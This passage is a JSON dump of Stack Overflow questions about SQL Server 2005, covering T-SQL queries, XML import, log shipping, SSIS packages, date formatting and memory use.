later</li>\n<li>Do inserts into a temporary table with the same schema and periodically transfer them into the main table to keep the size of the table where insertions are happening small</li>\n<li>Anything else?</li>\n</ol>\n\n<p>--\nBased on the responses I have gotten, let me clarify a little bit:</p>\n\n<p>Portman: I'm using a clustered index because when the data is all imported I will need to access data sequentially in that order.  I don't particularly need the index to be there while importing the data.  Is there any advantage to having a nonclustered PK index while doing the inserts as opposed to dropping the constraint entirely for import?</p>\n\n<p>Chopeen:  The data is being generated remotely on many other machines (my SQL server can only handle about 10 currently, but I would love to be able to add more).  It's not practical to run the entire process on the local machine because it would then have to process 50 times as much input data to generate the output.</p>\n\n<p>Jason: I am not doing any concurrent queries against the table during the import process, I will try dropping the primary key and see if that helps.</p>\n\n<p>~ Andrew</p>\n"},{"tags":["tsql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":12169279,"title":"Is it possible to refactor this statement to remove the subquery?","body":"<p>I'm trying to take data from one column, <code>MyTable.SSN</code>, and copy it to another in the same table, <code>MyTable.SSNWithDashes</code>, just formatted differently.  If <code>MyTable.SSN</code> doesn't have exactly 9 digits, I don't care to process it at all.</p>\n\n<p>I've tried this:</p>\n\n<pre><code>IF( SELECT LEN( [SSN] ) FROM [MyTable] ) = 9\nUPDATE [MyTable] SET [SSNWithDashes] = LEFT( [SSN], 3 ) + '-' + SUBSTRING( [SSN], 4, 2 ) + '-' + RIGHT( [SSN], 4 ) \nELSE\nUPDATE [MyTable] SET [SSNWithDashes] = NULL\n</code></pre>\n\n<p>While this works, it throws an error:</p>\n\n<p><code>Subquery returned more than 1 value. This is not permitted when the subquery follows =, !=, &lt;, &lt;= , &gt;, &gt;= or when the subquery is used as an expression.</code></p>\n\n<p>While I do understand what the warning is saying, I'm not really sure how to go about this differently.</p>\n\n<p>How can I refactor this to remove that warning (and perhaps read a little cleaner)?</p>\n"},{"tags":["sql-server","xml","sql-server-2005","xquery"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":38,"score":1,"question_id":12166242,"title":"Import XML by matching on tag attribute content in SQL Server 2005","body":"<p>I have an XML data file that looks like this:</p>\n\n<pre><code>&lt;Sales&gt;\n    &lt;Store Number=\"8\" Date=\"2012-08-20T03:00:00\"&gt;\n        &lt;Value Field=\"CanceledOrders\" Value=\"65.00\"/&gt;\n        &lt;Value Field=\"TotalDollars\" Value=\"13.57\"/&gt;\n    &lt;/Store&gt;\n    &lt;Store Number=\"10\" Date=\"2012-08-20T03:00:00\"&gt;\n        &lt;Value Field=\"CanceledOrders\" Value=\"38.00\"/&gt;\n        &lt;Value Field=\"TotalDollars\" Value=\"29.22\"/&gt;\n    &lt;/Store&gt;\n&lt;/Sales&gt;\n</code></pre>\n\n<p>I am scratching my head on how to extract this into a normal SQL table like this:</p>\n\n<pre><code>+--------+---------------------+----------------+--------------+\n| Number |        Date         | CanceledOrders | TotalDollars |\n+--------+---------------------+----------------+--------------+\n|      8 | 2012-08-20T03:00:00 | 65.00          | 13.57        |\n|     10 | 2012-08-20T03:00:00 | 38.00          | 29.22        |\n+--------+---------------------+----------------+--------------+\n</code></pre>\n\n<p>Here is what I have so far. I can't figure out how to match on XML attribute content value.\nI would like to match on the /Sales/Store/Value/@Field contents and return the value from /Sales/Store/Value/@Value.</p>\n\n<pre><code>DECLARE @X AS xml\n\nSET @X = '&lt;Sales&gt;\n  &lt;Store Number=\"8\" Date=\"2012-08-20T03:00:00\"&gt;\n    &lt;Value Field=\"CanceledOrders\" Value=\"65.00\" /&gt;\n    &lt;Value Field=\"TotalDollars\" Value=\"13.57\" /&gt;\n  &lt;/Store&gt;\n  &lt;Store Number=\"10\" Date=\"2012-08-20T03:00:00\"&gt;\n    &lt;Value Field=\"CanceledOrders\" Value=\"38.00\" /&gt;\n    &lt;Value Field=\"TotalDollars\" Value=\"29.22\" /&gt;\n  &lt;/Store&gt;\n&lt;/Sales&gt;'\n\n-- This is my start but it obviously doesn't return what I need.\nSELECT Y.ID.value('(@Number)[1]', 'int') AS Number,\n       Y.ID.value('(@Date)[1]', 'datetime') AS [Date],\n       Y.ID.value('(Value/@Field)[1]', 'varchar(max)') AS \"Field\",\n       Y.ID.value('(Value/@Value)[1]', 'varchar(max)') AS \"Value\"\nFROM   @X.nodes('/Sales/Store') AS Y(ID) \n</code></pre>\n"},{"tags":["c#","asp.net",".net","sql-server","sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":293,"score":0,"question_id":12166101,"title":"Thread is being aborted","body":"<p>What exactly does all this mean below. I am running an asynchronous web request that calls a page that sends code to my database. Then my database fires off a stored procedure that runs into one of my SQL assemblies.  Most times it works, but sometimes I get this:</p>\n\n<p>Thread was being aborted.</p>\n\n<p>Description: An unhandled exception occurred during the execution of the current web request. Please review the stack trace for more information about the error and where it originated in the code. </p>\n\n<p>Exception Details: System.Threading.ThreadAbortException: Thread was being aborted.</p>\n\n<p>Source Error: </p>\n\n<pre><code>An unhandled exception was generated during the execution of the current web request. Information regarding the origin and location of the exception can be identified using the exception stack trace below.\n</code></pre>\n\n<p>Stack Trace: </p>\n\n<pre><code>[ThreadAbortException: Thread was being aborted.]\n    System.Web.HttpApplication.ExecuteStep(IExecutionStep step, Boolean&amp; completedSynchronously) +486\n    System.Web.ApplicationStepManager.ResumeSteps(Exception error) +501\n    System.Web.HttpApplication.System.Web.IHttpAsyncHandler.BeginProcessRequest(HttpContext context, AsyncCallback cb, Object extraData) +123\n    System.Web.HttpRuntime.ProcessRequestInternal(HttpWorkerRequest wr) +379\n</code></pre>\n"},{"tags":["sql","sql-server","sql-server-2008","sql-server-2005","log-shipping"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":83,"score":0,"question_id":12161206,"title":"SQL Server Log Shipping and creating a user on secondary server","body":"<p>We have server <code>A</code> that is our production server, we are using SQL Server log shipping to ship transaction logs from server <code>A</code> to <code>B</code>.</p>\n\n<p>I understand that server <code>B</code> is then in a warm-standby read-only state.</p>\n\n<p>My question is, how can we add a windows domain account to have read-only access to that database on server <code>B</code> but not have access to the database on server <code>A</code>.</p>\n\n<p>When I try to create a user and assign read-only access to server <code>B</code>, I cant of course be because server <code>B</code> is in standbay mode. How can I get around this?</p>\n\n<p>Thanks.</p>\n"},{"tags":["sql","sql-server-2005","tsql","min"],"answer_count":10,"favorite_count":2,"up_vote_count":10,"down_vote_count":1,"view_count":22853,"score":9,"question_id":368351,"title":"What's the best way to select the minimum value from multiple columns?","body":"<p>Given the following table in SQL Server 2005:</p>\n\n<pre><code>ID   Col1   Col2   Col3\n--   ----   ----   ----\n1       3     34     76  \n2      32    976     24\n3       7    235      3\n4     245      1    792\n</code></pre>\n\n<p>What is the best way to write the query that yields the following result (i.e. one that yields the final column - a column containing the minium values out of Col1, Col2, and Col 3 <strong>for each row</strong>)?</p>\n\n<pre><code>ID   Col1   Col2   Col3  TheMin\n--   ----   ----   ----  ------\n1       3     34     76       3\n2      32    976     24      24\n3       7    235      3       3\n4     245      1    792       1\n</code></pre>\n\n<p><strong><em>UPDATE:</em></strong></p>\n\n<p>For clarification (as I have said in the coments) in the real scenario the database is <strong>properly normalized</strong>. These \"array\" columns are not in an actual table but are in a result set that is required in a report. And the new requirement is that the report also needs this MinValue column. I can't change the underlying result set and therefore I was looking to T-SQL for a handy \"get out of jail card\".</p>\n\n<p>I tried the CASE approach mentioned below and it works, although it is a bit cumbersome. It is also more complicated than stated in the answers because you need to cater for the fact that there are two min values in the same row.</p>\n\n<p>Anyway, I thought I'd post my current solution which, given my constraints, works pretty well. It uses the UNPIVOT operator:</p>\n\n<pre><code>with cte (ID, Col1, Col2, Col3)\nas\n(\n    select ID, Col1, Col2, Col3\n    from TestTable\n)\nselect cte.ID, Col1, Col2, Col3, TheMin from cte\njoin\n(\n    select\n    \tID, min(Amount) as TheMin\n    from \n    \tcte \n    \tUNPIVOT (Amount for AmountCol in (Col1, Col2, Col3)) as unpvt\n    group by ID\n) as minValues\non cte.ID = minValues.ID\n</code></pre>\n\n<p>I'll say upfront that I don't expect this to offer the best performance, but given the circumstances (I can't redesign all the queries just for the new MinValue column requirement), it is a pretty elegant \"get out of jail card\".</p>\n"}]}
{"total":14387,"page":10,"pagesize":100,"questions":[{"tags":["sql-server-2005","reporting-services","tiff"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":1766,"score":1,"question_id":126584,"title":"Displaying Tiff files in SSRS reports","body":"<p>I have a requirement to be be able to embed scanned tiff images into some SSRS reports.</p>\n\n<p>When I design a report in VS2005 and add an image control the tiff image displays perfectly however when I build it. I get the warning :</p>\n\n<p><code>Warning    2   [rsInvalidMIMEType] The value of the MIMEType property for the image image1 is image/tiff, which is not a valid MIMEType.   c:\\SSRSStuff\\TestReport.rdl 0   0</code></p>\n\n<p>and instead of an image I get the little red x.</p>\n\n<p>Has anybody overcome this issue?</p>\n"},{"tags":["sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":110,"score":0,"question_id":12158222,"title":"how to find data for whole month for date format dd/mm/yyyy?","body":"<p>I have a database with date format \"yyyyymmdd' and data-type varchar(8). In this case when I need to find a data for whole month I used to write code like below :</p>\n\n<pre><code>  select * from table1\n  where Date Between (convert(varchar(6),getdate(),112)+'01')\n  AND (convert(varchar(6),getdate(),112)+'31'))\n</code></pre>\n\n<p>Now I just have a new table with date format \"dd/mm/yyyy\" and date type varchar(10) and I would like to  extract data from the table for whole month without specifying exact date. I want start date as first day of current and month and end date as last day of the current month.</p>\n\n<p>But I don't now how to do the same as the date format is now 'dd/mm/yyyy'. </p>\n"},{"tags":["asp.net","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":83,"score":1,"question_id":12157037,"title":"How to insert all rows in grid at once into SQL Server 2005 database?","body":"<p>I need to insert all the rows in a gridview into a SQL Server 2005 database at once. </p>\n\n<p>Number of rows can be 1 to n (not more than 200)</p>\n\n<p>I have investigated the following options:</p>\n\n<ul>\n<li>Loops: I want to avoid the iterations.</li>\n<li>Table datatype: available in SQL Server 2008 and onwards only</li>\n<li>Bulk Copy: useful in case of bulk data. I am not sure whether I can use it insert less no of rows (performance wise)</li>\n</ul>\n\n<p>What else I can use?</p>\n"},{"tags":["sql-server-2005","datetime-format"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":77,"score":0,"question_id":12156297,"title":"Date format issue ","body":"<p>One problem in SQL Server 2005:</p>\n\n<p>I need all dates in <code>dd/mm/yyyy</code> format </p>\n\n<pre><code>SELECT\n    CONVERT(NCHAR(10), FromDate, 103) AS FromDate,\n    CONVERT(NCHAR(10), ToDate, 103) AS ToDate \nFROM Tbl_PropertyRoomSeasonPrices\n</code></pre>\n\n<p>OUTPUT :</p>\n\n<pre><code>28/08/2012  |   09/01/2012\n\ndd/mm/yyyy  |   mm/dd/yyyy  \n(CORRECT)       (WRONG)\n</code></pre>\n\n<p>but 103 for fromDate and 101 for toDate makes it both same, why the variations?</p>\n\n<p><strong>values are saved as follows:</strong> </p>\n\n<p><em><strong>BLL</em></strong></p>\n\n<pre><code>public DateTime FromDate\n    {\n        get {return _fromDate;} \n        set{ _fromDate = value; }\n    }\n\n    public DateTime ToDate\n    {\n        get {return _toDate;}   \n        set{ _toDate = value;   }\n    }\n\n public bool Save()\n    {\n        return _dalTbl_PropertyRoomSeasonPrices.Save();\n    }\n</code></pre>\n\n<p><em><strong>DAL</em></strong></p>\n\n<pre><code>public bool Save()\n    {\n        try\n{\n DataAccessLayerBaseClassDALBC=DataAccessLayerFactory.GetDataAccessLayer();         \n IDataParameter[]parameters=DALBC.CreateParameters(2);\n parameters[0] = DALBC.CreateParameter(\"@FromDate\",    this._tbl_propertyroomseasonprices.FromDate);\nparameters[1] = DALBC.CreateParameter(\"@ToDate\",    this._tbl_propertyroomseasonprices.ToDate);\nDALBC.ExecuteScalar(\"spSave_Tbl_PropertyRoomSeasonPrices\", CommandType.StoredProcedure, parameters);                \n        }\n        catch (Exception ex)\n        {\n\n            return false;\n        }\n        return true;\n    }\n</code></pre>\n\n<p><em><strong>SQL</em></strong></p>\n\n<pre><code>ALTER PROCEDURE [dbo].[spSave_Tbl_PropertyRoomSeasonPrices]\n(\n@Id int,\n\n@FromDate datetime = NULL,\n@ToDate datetime = NULL\n\n)\nAS\nDECLARE @count int  \nSET NOCOUNT ON\n\nSELECT @count=COUNT(*) FROM Tbl_PropertyRoomSeasonPrices WHERE \n        [Id] = @Id\n\nIF @count&lt;=0 BEGIN\n    INSERT INTO [Tbl_PropertyRoomSeasonPrices]\n    (\n\n    [FromDate],\n    [ToDate]\n    )\n    VALUES\n    (   \n\n    @FromDate,\n    @ToDate     \n    )\n\nSELECT @Id = SCOPE_IDENTITY();\n\n\nEND\nELSE BEGIN\n    UPDATE [Tbl_PropertyRoomSeasonPrices]\n    SET\n\n    [FromDate] = @FromDate,\n    [ToDate] = @ToDate\n\n    WHERE \n            [Id] = @Id\n\n\nEND \n\n\n        SELECT @Id\n</code></pre>\n"},{"tags":["sql","tsql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":7,"down_vote_count":0,"view_count":193,"score":7,"question_id":12059119,"title":"TSQL equally divide resultset to groups and update them","body":"<p>I have my database with 3 tables like so:</p>\n\n<p><img src=\"http://i.stack.imgur.com/uPj06.jpg\" alt=\"enter image description here\"></p>\n\n<p>Orders table has data like below:</p>\n\n<pre><code>OrderID    OperatorID    GroupID        OrderDesc    Status    Cash    ...\n--------------------------------------------------------------------------\n      1             1          1      small order         1     100 \n      2             1          1    another order         2       0 \n      3             1          2      xxxxxxxxxxx         2    1000 \n      5             2          2      yyyyyyyyyyy         2     150 \n      9             5          1      xxxxxxxxxxx         1       0 \n     10          NULL          2      xxxxxxxxxxx         1      10 \n     11          NULL          3      xxxxxxxxxxx         1     120 \n</code></pre>\n\n<p>Operators table:</p>\n\n<pre><code>OperatorID    Name    GroupID    Active\n---------------------------------------\n      1       John          1         1\n      2       Kate          1         1\n      4       Jack          2         1\n      5       Will          1         0\n      6        Sam          3         1\n</code></pre>\n\n<p>Group table:</p>\n\n<pre><code>GroupID    Name\n---------------\n      1      G1\n      2      G2\n      3      X1\n</code></pre>\n\n<p>As You can see John has 3 orders, Kate 1, Will 1, Jack and Sam none.<br /></p>\n\n<p>Now I would like to assign operators to orders base on some conditions:</p>\n\n<ul>\n<li>order must have cash>0</li>\n<li>order must have status=1</li>\n<li>order must be in group 1 or 2</li>\n<li>operator must be active (active=1)</li>\n<li>operator must be in group 1 or 2</li>\n</ul>\n\n<p>This is the result that I would like to get:</p>\n\n<pre><code>OrderID    OperatorID    GroupID        OrderDesc    Status    Cash    ...\n--------------------------------------------------------------------------\n      1             1          1      small order         1     100       &lt; change\n      2             1          1    another order         2       0 \n      3             2          2      xxxxxxxxxxx         2    1000       &lt; change\n      5             4          2      yyyyyyyyyyy         2     150       &lt; change\n      9             5          1      xxxxxxxxxxx         1       0 \n     10             4          2      xxxxxxxxxxx         1      10       &lt; change\n     11          NULL          3      xxxxxxxxxxx         1     120 \n</code></pre>\n\n<p>I would like to shuffle orders and update operatorID so that every time I call this script I get randomly assigner operatorID, but every operator will have equal number or orders (close to equal, because if I have 7 orders one person will have 3 and rest 2).</p>\n\n<p>I can use <code>NTILE</code> to distribute orders into groups, but I need to assign operatorID to that group.</p>\n\n<p>I think that I need to do something like this:</p>\n\n<pre><code>SELECT NTILE(2) OVER( order by orderID desc) as newID,* \nFROM\n    orders(NOLOCK)\n</code></pre>\n\n<p>This will give me my orders table grouped into equal parts. What I need to know is length of operators table (to add it as parameter to NTILE), after that I could join my results with operators (using <code>row_number()</code>)</p>\n\n<p>Is there a better solution?</p>\n\n<p>My question again: <strong>How to equally divide result set into groups and update that record set using another table data?</strong></p>\n\n<p><strong>EDIT:</strong>\nThis is my code so far: <a href=\"http://sqlfiddle.com/#!3/39849/25\" rel=\"nofollow\">http://sqlfiddle.com/#!3/39849/25</a></p>\n\n<p><strong>EDIT 2</strong>\nI've updated my question and added more conditions.</p>\n\n<p>I would like to assign operators to orders based on some conditions:</p>\n\n<ul>\n<li>order must have cash>0</li>\n<li>order must have status=1</li>\n<li>order must be in group 1 or 2</li>\n<li>operator must be active (active=1)</li>\n<li>operator must be in group 1 or 2</li>\n</ul>\n\n<p>I'm building this query as stored procedure.<br />\nSo the first step will be to generate data with new assignments into temporary table and after final approval in second step to update main table based on that temp table.</p>\n\n<p>I have 2 more questions:</p>\n\n<ol>\n<li><p>Will it be better to first select all all orders  and all operators that meets the conditions to temporary table and then do the shuffling or to do it all in one big query?</p></li>\n<li><p>I would like to pass array or groups as a parameter to my procedure. Which option would be the best to pass array to stored procedure (SQL Server 2005).<br /><br />\nI know this was asked many times but I would like to know if it is better to create a separate function that will cut comma separated string into table (<a href=\"http://www.sommarskog.se/arrays-in-sql-2005.html\" rel=\"nofollow\">http://www.sommarskog.se/arrays-in-sql-2005.html</a>) or to put everything inside one big fat procedure? :)</p></li>\n</ol>\n\n<hr>\n\n<p><strong>FINAL ANSWER:</strong> avilable at <a href=\"http://sqlfiddle.com/#!3/afb48/2\" rel=\"nofollow\">http://sqlfiddle.com/#!3/afb48/2</a></p>\n\n<pre><code>SELECT o.*, op.operatorName AS NewOperator, op.operatorID AS NewOperatorId\nFROM (SELECT o.*, (ROW_NUMBER() over (ORDER BY newid()) % numoperators) + 1 AS randseqnum\n      FROM Orders o CROSS JOIN\n     (SELECT COUNT(*) AS numoperators FROM operators WHERE operators.active=1) op\n      WHERE o.cash&gt;0 and o.status in (1,3)\n     ) o JOIN\n     (SELECT op.*, ROW_NUMBER() over (ORDER BY newid()) AS seqnum\n      FROM Operators op WHERE op.active=1\n     ) op\n     ON o.randseqnum = op.seqnum ORDER BY o.orderID\n</code></pre>\n\n<p>Answer based on Gordon's Linoff answer. Thanks!</p>\n"},{"tags":["sql-server-2008","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":87,"score":0,"question_id":12154817,"title":"Scheduled job failure","body":"<p>I have a schedule job to take backup for every 8 hours in SQL Server 2008. Till day before yesterday everything was working fine but all of sudden the job got failed with the error message below.</p>\n\n<p>Executed as user: NT AUTHORITY\\SYSTEM. A nonrecoverable I/O error occurred on file \"FilePath\\FileName.BAK:\" 112(failed to retrieve text for this error. Reason: 15105). [SQLSTATE 42000] (Error 3271)  BACKUP DATABASE is terminating abnormally. [SQLSTATE 42000] (Error 3013).  The step failed.</p>\n\n<p>I tried searching in google bout didn't get the exact idea. Consider me a newbee in SQL Server 2008</p>\n\n<p>Any suggestions will be higly appriciated.</p>\n\n<p>Thanks.</p>\n"},{"tags":["sql-server","sql-server-2005","memory"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":12148917,"title":"Sql Server 2005 Memory allocations","body":"<p>How do I find out the max and min memory allocated for SQL Server 2005? My sql server appears to have maxed out its memory on my box and does not seem to be doing any garbage collection.</p>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005","join"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":69,"score":1,"question_id":12145305,"title":"Is there documentation on/can someone explain a nested join in TSQL?","body":"<p>I'm not quite sure how to describe this, and I'm not quite sure if it's just syntactical sugar. This is the first time I've seen it, and I'm having trouble finding a reference or explanation as to the why and what of it.</p>\n\n<p>I have a query as follows:</p>\n\n<pre><code>select * from\n     table1\n          join table2 on field1 = field2\n          join (\n               table3 \n                    join table4 on field3 = field4\n                    join table5 on field5 = field6\n               ) on field3 = field2 \n               -- notice the fields in the parens and outside the parens \n               -- are part of the on clause\n</code></pre>\n\n<p>Are the parentheses necessary? Will removing them change the join order? I'm in a SQL Server 2005 environment in this case. Thanks!</p>\n"},{"tags":["sql-server","sql-server-2008","entity-framework","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":67,"score":1,"question_id":12146916,"title":"collation as function argument","body":"<p>I have a database that is supposed to store data in any language, there is going to be a column that tells me which locale it is, so i can't rely on database collation and will have to specify collation at runtime in queries.</p>\n\n<p>I also have the problem that i want to use <code>EF</code> for dataaccess, as we know using EF one cannot specify collation at runtime. I am thinking about creating a sql function that takes collation as argument and apply that function in all of the <code>Linq</code> Queries.</p>\n\n<p>but this fails </p>\n\n<pre><code>CREATE FUNCTION fn_Compare\n(   \n    @TextValue nvarchar(max),\n    @Culture varchar(10)\n)\nRETURNS  nvarchar(max)\nAS\nBEGIN\n    RETURN @TextValue COLLATE @Culture\nEND\nGO\n</code></pre>\n\n<p>does anyone know if this can be done ? </p>\n"},{"tags":["sql-server","performance","sql-server-2005","memory"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":12147511,"title":"SQL Server 2005 performance issues","body":"<p>My logs look like this:</p>\n\n<pre><code>2012-08-24 16:43:32.00 spid56      Task (Worker 0x0000000407CF61C0) was forced to yield 6 times: SpCreatePowerStatCorr '9604bddb-565a-434e-b9a0-40704e7ede6c', 4, 0\n2012-08-24 16:46:49.01 spid56      Task (Worker 0x000000042F46C1C0) was forced to yield 11 times: SpCreatePowerStatCorr '9604bddb-565a-434e-b9a0-40704e7ede6c', 5, 0\n2012-08-24 16:53:12.16 spid55      Task (Worker 0x000000034974A1C0) was forced to yield 27 times: SpCreatePowerStatCorr '9604bddb-565a-434e-b9a0-40704e7ede6c', 7, 0\n2012-08-24 16:58:54.44 spid57      Task (Worker 0x000000009504A1C0) was forced to yield 20 times: SpCreatePowerStatCorr '9604bddb-565a-434e-b9a0-40704e7ede6c', 7, 0\n2012-08-24 16:59:26.90 spid55      Task (Worker 0x00000004144421C0) was forced to yield 28 times: SpCreatePowerStatCorr '9604bddb-565a-434e-b9a0-40704e7ede6c', 8, 0\n2012-08-24 17:16:51.94 spid57      Task (Worker 0x0000000405B661C0) was forced to yield 97 times: SpCreatePowerStatCorr '9604bddb-565a-434e-b9a0-40704e7ede6c', 8, 0\n</code></pre>\n\n<p>The SpCreatePowerStatCorr is a stored procedure that calls one of my SQL assemblies. I also noticed that our SQL server memory gets maxed out and never disposes of it's memory.</p>\n\n<p>Is there any way to improve Memory Management?  What does the worker yielding mean (will it cause the stored procedure to hang)?</p>\n"},{"tags":["sql-server","sql-server-2005","ssis"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1163,"score":0,"question_id":3772514,"title":"SSIS Execute a Stored Procedure with the parameters from .CSV file SQL Server 2005","body":"<p>I'm learning SSIS and this seems like an easy task but I'm stuck. </p>\n\n<p>I have a CSV file Orders.csv with this data:</p>\n\n<pre><code>ProductId,Quantity,CustomerId\n1,1,104\n2,1,105\n3,2,106\n</code></pre>\n\n<p>I also have a stored procedure ssis_createorder that takes as input parameters:\n@productid int\n@quantity int\n@customerid int</p>\n\n<p>What I want to do is create an SSIS package that takes the .csv file as input and calls ssis_createorder three times for each row in the .csv file (the first row contains column names). </p>\n\n<p>Here is what I have done so far. </p>\n\n<p>I have created an SSIS package (Visual Studio 2005 &amp; SQL Server 2005). </p>\n\n<p>In Control Flow I have a Data Flow Task. </p>\n\n<p>The Data Flow has a Flat File source of my .csv file. All of of the columns are mapped. </p>\n\n<p>I have created a variable named orders of type Object. I also have variables CustomerId, ProductId, &amp; Quantity of type int32. </p>\n\n<p>Next I have a Recordset Destination that is assigning the contents of the .csv file into the varialbe orders. I'm not sure about how to use this tool. I'm setting the VariableName (under Customer Properties) to User::orders. I think that now orders holds an ADO record set made up of the contents from the original .csv file. </p>\n\n<p>Next I'm adding a ForEach Loop Container on the Control Flow tag and linking it to the Data Flow Task. </p>\n\n<p>Inside of the ForEach Loop Container I'm setting the Enumerator to \"ForEach ADO Enumerator\". I'm setting \"ADO object source variable\" to User::orders\". For Enumeration mode I'm selecting \"Rows in the first table\". </p>\n\n<p>In the Variable Mapping tab I have User::ProductId index 0, User::Quantity index 1, User::CustomerId index 2.  I'm not sure if this is correct. </p>\n\n<p>Next I have a Script Task inside of the ForEach Loop Container. </p>\n\n<p>I have ReadOnlyVariables set to ProductId. </p>\n\n<p>In the Main method this is what I'm doing:</p>\n\n<pre><code> Dim sProductId As String = Dts.Variables(\"ProductId\").Value.ToString\n\n MsgBox(\"sProductId\")\n</code></pre>\n\n<p>When I run the package my ForEach Loop Container turns Bright Red and I get the following error messages</p>\n\n<pre><code>Error: 0xC001F009 at MasterTest: The type of the value being assigned to variable \"User::ProductId\" differs from the current variable type. Variables may not change type during execution. Variable types are strict, except for variables of type Object.\nError: 0xC001C012 at Foreach Loop Container: ForEach Variable Mapping number 1 to variable \"User::ProductId\" cannot be applied.\nError: 0xC001F009 at MasterTest: The type of the value being assigned to variable \"User::Quantity\" differs from the current variable type. Variables may not change type during execution. Variable types are strict, except for variables of type Object.\nError: 0xC001C012 at Foreach Loop Container: ForEach Variable Mapping number 2 to variable \"User::Quantity\" cannot be applied.\nError: 0xC001F009 at MasterTest: The type of the value being assigned to variable \"User::CustomerId\" differs from the current variable type. Variables may not change type during execution. Variable types are strict, except for variables of type Object.\nError: 0xC001C012 at Foreach Loop Container: ForEach Variable Mapping number 3 to variable \"User::CustomerId\" cannot be applied.\nWarning: 0x80019002 at MasterTest: SSIS Warning Code DTS_W_MAXIMUMERRORCOUNTREACHED.  The Execution method succeeded, but the number of errors raised (12) reached the maximum allowed (1); resulting in failure. This occurs when the number of errors reaches the number specified in MaximumErrorCount. Change the MaximumErrorCount or fix the errors.\nSSIS package \"Package.dtsx\" finished: Failure.\n     Dts.TaskResult = Dts.Results.Success\n</code></pre>\n\n<p>Any help would be appreciated</p>\n"},{"tags":["sql","sql-server-2005","join","coalesce"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":71,"score":1,"question_id":12100415,"title":"Complex join with coalesce","body":"<p>I have a table that I am stuffing demographic info into and then using dynamic sql to build a table from that. The demographic info comes from surveys and some of the surveys have checkboxes. With checkboxes people can select multiple values.</p>\n\n<p>So I need to enter all the choices as a comma seperated list. </p>\n\n<pre><code>CREATE TABLE Demographics \n  (\n    QID NVARCHAR(15)\n    ,userid NVARCHAR(50)\n    ,question NVARCHAR(800)\n    ,choice NVARCHAR(1000)\n  )\n...\n...\n--Demographics(QID,userid,question,choice)\n--'Insert checkbox (type 5)\nINSERT INTO Demographics\nSELECT CAST(q.QID AS NVARCHAR(15))\n    ,ri.userid\n    ,q.QuestionText\n    ,ac.Choice\nFROM ResponseInfo ri --response details\nJOIN Responses r ON ri.ResponseID = r.ResponseID --actual response\nJOIN Questions q ON r.QID = q.QID --question info\nJOIN AnswerChoices ac ON r.QID = ac.QID --answer choice text\nWHERE (q.QuestionTypeID = 5 AND q.QID = ac.QID\nAND r.IsOther = 0 \nAND q.QID = 16\n)\nAND ri.userid IN (SELECT userid FROM @Users) AND r.Response = ac.Sequence\nORDER BY ri.userid\n...\ndynamic sql stuff\n...\nEXEC sp_exesql @sql\n</code></pre>\n\n<p>My results look like this:</p>\n\n<pre><code>users | question_15 | choice_15 | question_16     | choice_16 |\nbill  | age?        | 37        | favorite color? | red       |\nbill  | age?        | 37        | favorite color? | green     |\n</code></pre>\n\n<p>But it needs to be:</p>\n\n<pre><code>users | question_15 | choice_15 | question_16     | choice_16 |\nbill  | age?        | 37        | favorite color? | red,green |    \n</code></pre>\n\n<p>I tried doing </p>\n\n<pre><code>,COALESCE(ac.Choice + ',','') + ac.Choice\n</code></pre>\n\n<p>It gave me</p>\n\n<pre><code>bill  | age?        | 37        | favorite color? | red,red   |\n</code></pre>\n\n<p>Can anyone help me sort this out?</p>\n"},{"tags":["sql-server-2005","insert-update","multiple-columns"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":79,"score":3,"question_id":12144516,"title":"Updating tables without naming all columns","body":"<p>I have found a way to make two tables from different databases match each other using this template:</p>\n\n<pre><code>INSERT [DestDB].[dbo].[TABLE]\nSELECT source.* FROM \n[SourceDB].[dbo].[TABLE] AS source\nLEFT OUTER JOIN\n[DestDB].[dbo].[TABLE] AS dest\nON \nsource.[PKColumn] = dest.[PKColumn]\nWHERE dest.[PKcolumn] IS NULL\n\nUPDATE dest\nSET \n dest.[PK_COLUMN1] = source.[PK_COLUMN1]\n,dest.[COLUMN2] = source.[COLUMN2]\n,dest.[COLUMN3] = source.[COLUMN3]\n,dest.[COLUMN4] = source.[COLUMN4]\n,dest.[COLUMN5] = source.[COLUMN5]\n,dest.[COLUMN6] = source.[COLUMN6]\n,dest.[COLUMN7] = source.[COLUMN7]\n,dest.[COLUMN8] = source.[COLUMN8]\n\nFROM \n[SourceDB].[dbo].[TABLE] AS source\nINNER JOIN \n[DestDB].[dbo].[TABLE] AS dest\nON source.[PK_Column1] = dest.[PK_Column1]\n</code></pre>\n\n<p>However some tables I am working with have at least 200 columns and while it is possible to do this through the power of Copy + Paste, I just need to know if there is a way that doesn't involve me getting Carpel Tunnel Syndrome.</p>\n\n<p>I am using Microsoft SQL Server 2005.</p>\n\n<p>Any advice?</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":242,"score":-1,"question_id":2027138,"title":"Analyze the results of the sql query : dbcc showcontig","body":"<p>How can I analyze the results of the sql query : <code>dbcc showcontig</code> to improve the performance of 